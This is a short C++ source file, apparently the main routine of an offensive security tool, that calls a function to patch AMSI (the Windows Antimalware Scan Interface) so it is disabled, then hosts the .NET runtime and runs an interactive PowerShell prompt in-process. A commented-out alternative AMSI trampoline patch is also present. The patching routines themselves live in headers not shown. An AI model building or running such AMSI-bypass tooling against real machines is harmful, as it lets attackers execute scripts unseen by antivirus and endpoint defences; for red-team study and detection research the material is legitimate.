#include "powershell.h"
#include "ghost_amsi.h"
#include "clr.h"

int main() {
	std::wstring input;
	//if (!PatchAmsiWithTrampoline()) {
	//	printf("\n[-] AMSI Bypass FAILED!\n");
	//	return 1;
	//}
	if (!PatchAmsiOpenSession()) {
		PRINT_ERROR("Failed to disable AMSI (1).\n");
	}

	CLR clr;
	if (!clr.InitCLR()) {
		wprintf(L"[!] Failed to init CLR\n");
		return 0;
	}

	while (1) {
		std::wstring out;
		std::cout << "PS > ";
		std::getline(std::wcin, input);
		Invoke(clr, input, &out);

		std::wcout << out << "\n";
	}

}